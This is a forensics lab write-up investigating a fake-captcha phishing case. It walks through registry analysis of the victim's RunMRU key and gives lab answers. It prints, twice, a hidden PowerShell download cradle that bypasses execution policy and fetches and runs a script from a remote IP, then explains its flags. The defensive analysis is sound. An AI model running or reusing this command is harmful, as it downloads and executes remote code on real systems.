# Pikaptcha

![image](https://github.com/user-attachments/assets/e29f4a11-7ca9-4957-881f-859e6d749c7a)


> Write-up author: jon-brandy

## Lessons Learned:
1. Using registry explorer to load user's registry hive.
2. Reviewing malicious powershell that acts as a downloader.

## SCENARIO:
<p align="justify">Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.</p>

## STEPS:
1. In this case, we're tasked to investigate a recent phising attack.
2. A person named Happy Grunwald contacted Alonzo, a system administrator, regarding an issue with downloading the latest version of Microsoft Office.
3. Happy reported that he received an email instructing him to update Microsoft Office via a link. After clicking the link, he was prompted to solve a CAPTCHA, but no download page appeared afterward.
4. Recognizing this as a potential phishing attempt, Alonzo became suspicious of the attacker’s tactics. He contacted the security team, who promptly isolated the victim’s machine and provided us with network traffic data and endpoint artifacts for analysis.

![image](https://github.com/user-attachments/assets/8e6a4129-e597-4e74-8094-b4c111b3cf51)


> 1ST QUESTION --> ANS: `powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`

![image](https://github.com/user-attachments/assets/a78977c0-5c0a-48a5-8b36-473255407f4a)


5. We're given many registry hives and prefetch folder, it's kinda painful to analyze windows registry hives without knowing the context and location of what is our interest.
6. To review recently executed command, we can start analyzing from `RunMRU` registry key for **happy grunwald** user.
7. To analyze the registry hives I used `registry explorer`. To load the registry hive for user **happy grundwald**, simply load the `NTUSER.DAT` of **happy grundwald**.

![image](https://github.com/user-attachments/assets/7858c1ff-0032-44dd-9f25-eaa84c5689e5)


> RESULT IN REGISTRY EXPLORER

![image](https://github.com/user-attachments/assets/72e2be4e-ba96-4edc-a1ca-1f5427eb33c6)



8. Again, to reduce the pain by traverse the folder manually, instead we can use the search bar to find **RunMRU**.

![image](https://github.com/user-attachments/assets/bc3c7289-8ebd-4375-99fb-885d9f3873dc)


9. Notice that we found a powershell command execution from a remote source. This is a hint for a malicious activity.

> Malicious Powershell Script

```pwsh
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1
```

#### NOTES REGARDING THE POWERSHELL EXECUTION FOUND:

`-NoP` flag (No Profile), is used to prevent powershell from loading the user's profile scripts (it can be used to reduce startup time). `-Noni` (Non-Interactive) flag is used to run the powershell script in a non-interactive mode. `-W hidden` flag is used to hides the powershell window, thus making the executiion invisible to the user.

The biggest red flag is `-Exec Bypass`, this flag used to override the system's execution policy, allowing the script to run regardless of any policy settings that might prevent it. This flag is actually is the biggest red flag if it is executed by non legitimate user.

`-Command` flag is used to specify the powershell command, `IEX` (Invoke Expression) this cmdlet is used to evaluate or runs the expression passed to it. `(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')` this part creates a new web client object to download the script from the remote server and this script content is passed to IEX which runs it in the current powershell session.

In short, this powershell command is used to download a malicious powersell script file --> `office2024install.ps1`. 


11. Anyway if we correlate this with cyber kill chain stages, this stage is at the **installation** stage --> stage where the attacker tried to gain persistence.
12. Great! Simple as that now we identified the full command that was run to download and execute the stager.


> 2ND QUESTION --> ANS:

![image](https://github.com/user-attachments/assets/ca12a9cd-dee8-4948-9431-11f2e50dd65e)

13. Again, we can identify the timestamp of the execution at the `registry explorer`. It is shown clear.

![image](https://github.com/user-attachments/assets/4f95b2d4-c53a-4bc7-a3cd-6643fde35cab)


> 3RD QUESTION --> ANS:

![image](https://github.com/user-attachments/assets/672f5b38-997b-4467-a94d-1db9dc5a9676)


> 4TH QUESTION --> ANS:

![image](https://github.com/user-attachments/assets/a0bf7148-2f6b-422d-bffb-22e92ccbb706)


> 5TH QUESTION --> ANS:

![image](https://github.com/user-attachments/assets/4d9b46be-84f4-4669-aa44-9be1ce7f280b)


> 6TH QUESTION --> ANS:

![image](https://github.com/user-attachments/assets/13f0b3f6-8563-4606-b356-4dd0d806f481)


# IMPORTANT LINKS:

```

```
